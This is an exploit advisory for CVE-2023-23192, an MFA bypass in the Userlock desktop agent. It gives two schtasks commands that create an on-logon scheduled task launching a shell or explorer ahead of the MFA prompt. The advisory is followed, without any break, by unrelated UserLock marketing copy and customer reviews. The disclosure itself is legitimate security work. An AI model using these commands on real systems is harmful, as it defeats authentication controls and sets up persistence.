### CVE-2023-23192- Userlock - Multi-Factor Authentication (MFA) Bypass

#### Exploit Title: Userlock - Multi-Factor Authentication (MFA) Bypass

#### Date: 01/11/2023

#### Exploit Author: Pinar Sadioglu

#### Vendor Homepage: [https://www.isdecisions.com/products/userlock/help/#](https://www.isdecisions.com/products/userlock/help/)

#### Version: < = 11.0.1.40

#### Tested on: Windows 10

#### Software : Tested with the Userlock 'Desktop agent' to protect interactive sessions on workstations or on terminal servers.

#### CVE : CVE-2023-23192

#### MITRE ATT&CK: T1053.005 - Scheduled Task/Job: Scheduled Task

#### Permissions Required: Administrator, Root

#### <https://nvd.nist.gov/vuln/detail/CVE-2023-23192>

Description: Userlock is a Multi-Factor Authentication solution for Windows Active Directory & Cloud Environments to stop unauthorized and unwanted access. It enables customized, two-factor authentication (2FA) on Windows logon, Remote Desktop (RDP & RD Gateway), IIS, VPN and Cloud Applications.Userlock allows you to implement MFA to your Active Directory logons domain joined workstations and servers. A dialog box is prompted where you can enter the OTP code, from the Authenticatior App at first logon of the day to their workstation. Userlock integrates with the logon process to deliver two-factor authentication.

One of the most commonly exploited strategies employed by threat actors to build persistence on a victim's computer is task scheduling. The adversary frequently use this strategy to evade automated detection, maintain persistence, and carry out surprise attacks after long periods of lying low.

Vulnerability:

Create a scheduled task that executed after at log on of any user.

```
> schtasks /create /tn "MFA_Bypass_OnLogon" /sc onlogon /tr "cmd.exe /c powershell.exe"

```

[![mfa](https://user-images.githubusercontent.com/18392750/226351934-e12c3a67-cc42-44da-8c51-9218d9143677.JPG)](https://user-images.githubusercontent.com/18392750/226351934-e12c3a67-cc42-44da-8c51-9218d9143677.JPG)

After successfully logging on with the domain credentials, scheduled cmd.exe is prompted with the Userlock MFA dialog box.

```
> schtasks /create /tn "MFA_Bypass_OnLogon" /sc onlogon /tr "cmd.exe /c explorer.exe"

```

![Watch the Video]( "Watch the Video")

## Take control of [multi-factor authentication (MFA)](/products/userlock/multi-factor-authentication-mfa-active-directory.htm "multi-factor authentication (MFA)") implementation

Enable flexible, no-fuss MFA differently across Windows login, Remote Desktop (RDP, RD Gateway, RemoteApp), IIS, VPN, offline, off-domain, and SaaS. Fully functional in air-gapped networks.

## Extend access security to the cloud with [single sign-on (SSO)](/products/userlock/single-sign-on-sso-active-directory.htm "single sign-on (SSO)")

Pair SSO with MFA to deliver secure, one-step access to Microsoft 365 and SaaS applications with a successful on-prem Active Directory logon.

## Layer security with [contextual access controls](/products/userlock/enforce-user-logon-restrictions-contextual-access-management.htm "contextual access controls")

Set fine-tuned access controls based on contextual and role-based factors:

* **Role:** Set different access controls based on AD users, groups, and organizational units (OUs).
* **Origin:** Define access based on machine, location, IP address, and more.
* **Time:** Limit access to working hours, set session length limits, and define a logon time quota.
* **Session type:** Manage access across workstation, terminal, Wi-Fi, VPN, IIS, SaaS, Remote Desktop (RDP, RD Gateway, RemoteApp), and VDI sessions.
* **Simultaneous connections:** Limit concurrent logins and define how many initial access points to allow by user, group, or OU.

## Detect threats with [session management](/products/userlock/monitor-active-directory-user-logon-logoff.htm "session management")

Monitor all user access events in real-time, set up alerts, and respond remotely to block or restrict any session directly from the console.

## Ensure data integrity with [Active Directory user login auditing](/products/userlock/active-directory-user-login-audit.htm "Active Directory user login auditing")

Track and record all Windows user logon events with a searchable, accurate audit across on-premise Active Directory and SaaS access, including access attempts.

## Support compliance with [user and admin activity reports](/products/userlock/windows-active-directory-user-logon-reports.htm "user and admin activity reports")

Create reports on all Active Directory user logon/logoff activities, MFA events, administrator actions, denied logons, and more to ensure compliance and support forensics.

## What clients say about **UserLock**

![Bill Hopkins]( "Bill Hopkins")
Review by Bill Hopkins - City of Keizer

### Affordable, Easy to Use With Active Directory

UserLock allows us to have one single 2FA solution for all of our users. It integrates easily with Active Directory, and is simple to install and maintain. It’s basically an IT Manager’s dream.

![Andreas L.]( "Andreas L.")
Review by Andreas L.

### Simple and Reliable

I've tested several 2FA software. In the end, I stuck with UserLock because it requires no administrative effort. I really like the reports and the control of who is connected to which device.

### An Administrators Premier Management Tool!

In a flash, I can control my users’ login experience, find/identify users computers and remote in for support. It’s just always there for me. I can’t imagine working without it now.
